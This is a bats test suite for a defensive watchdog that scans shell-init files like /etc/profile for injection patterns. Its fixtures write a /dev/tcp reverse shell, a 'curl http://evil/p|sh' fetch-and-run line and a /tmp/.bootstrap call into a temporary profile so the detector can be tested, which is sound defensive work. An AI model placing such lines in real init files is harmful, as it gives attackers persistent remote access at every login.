#!/usr/bin/env bats
# L2 bats functional tests for the shell-init-watchdog scan script.
#
# The system shell-init files (/etc/profile, /etc/bash.bashrc, /etc/zsh/*,
# /etc/profile.d/*.sh, the root dotfiles, …) are SOURCED for every login
# shell — a per-login exec surface (T1546). This watchdog is a pure
# content-pattern scanner: a shell-init file containing a command-injection /
# reverse-shell / obfuscation pattern is alert (event
# shell_init_suspicious_pattern). Ownership is covered by adjacent watchdogs;
# this one focuses on the high-signal content patterns.
#
# Run with: bats packaging/test/L2-shell-init-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd/shell-init-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PROFILE_F="${TMP}/profile"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SHELLINIT_PROFILE="${PROFILE:-report}" \
    SELFDEF_SHELLINIT_BASELINE="${BASELINE}" \
    SELFDEF_SHELLINIT_FILES="${FILES_V:-$PROFILE_F}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# /etc/profile\nexport EDITOR=vi\numask 022\n' > "${PROFILE_F}"
}

@test "benign shell-init, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged shell-init on second run → ok / shell_init_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in shell-init → alert / shell_init_suspicious_pattern" {
    seed_benign
    run_wd
    printf '# /etc/profile\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_suspicious_pattern"'
    cap | grep -q '"severity":"alert"'
}

@test "a writable-root invocation in shell-init → alert" {
    seed_benign
    run_wd
    printf '# /etc/profile\n/tmp/.bootstrap\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign shell-init change → warn / shell_init_changed" {
    seed_benign
    run_wd
    printf '# /etc/profile\nexport EDITOR=vim\numask 027\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"shell_init_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign shell-init is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious shell-init" {
    seed_benign
    run_wd
    printf '# /etc/profile\ncurl http://evil/p|sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
